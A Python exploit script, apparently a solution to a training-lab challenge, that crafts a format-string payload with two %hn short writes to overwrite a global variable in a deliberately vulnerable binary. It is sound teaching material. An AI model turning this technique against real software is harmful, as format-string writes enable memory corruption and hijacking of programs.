#!/usr/bin/env python3
"""
ex08 exploit  (format string: two %hn SHORT WRITES for a large value).

vuln(): fgets(buf[ebp-0x208],0x200,stdin); printbuffer(buf) -> printf(buf);
        if (target == 0x01025544) puts("you have modified the target :)")
target is a global at 0x080496f4.

Same format-string bug as ex07, but the required value 0x01025544 is huge
(~16.9M). Printing that many chars for a single %n is impractical, so we split
it into two 16-bit writes with %hn:
    low  half 0x5544 -> target     (0x080496f4)
    high half 0x0102 -> target+2   (0x080496f6)

Buffer starts at printf argument #12 (found with "AAAA%N$x" -> AAAA at N=12).
We place &target+2 and &target at the buffer start (args 12 and 13), then write
the SMALLER half first so the running character count only increases:

    [&target+2][&target] %250c %12$hn %21570c %13$hn
      4b    4b   -> 8 chars so far
      %250c      -> +250  = 258  = 0x0102 ; %12$hn writes it to target+2
      %21570c    -> +21570= 21828= 0x5544 ; %13$hn writes it to target
  => target = 0x0102<<16 | 0x5544 = 0x01025544

Usage (VM):   python3 ex08.py | /opt/hole-in-bin/ex08/bin
Local:        python3 scripts/ex08.py | scripts/runlocal.sh challenges/ex08/bin
"""
import struct
import sys

TARGET = 0x080496F4
VALUE  = 0x01025544
ARGNUM = 12                      # buffer position in printf's arg list

low  = VALUE & 0xFFFF            # 0x5544 -> target
high = (VALUE >> 16) & 0xFFFF    # 0x0102 -> target+2

# write the smaller half first; counts are cumulative
first_val, first_addr, first_arg   = high, TARGET + 2, ARGNUM       # 0x0102
second_val, second_addr, second_arg = low,  TARGET,     ARGNUM + 1  # 0x5544

addrs = struct.pack("<I", first_addr) + struct.pack("<I", second_addr)
pad1 = first_val - len(addrs)                 # chars to reach first_val
pad2 = second_val - first_val                 # extra chars to reach second_val

payload  = addrs
payload += b"%%%dc%%%d$hn" % (pad1, first_arg)
payload += b"%%%dc%%%d$hn" % (pad2, second_arg)
payload += b"\n"
sys.stdout.buffer.write(payload)
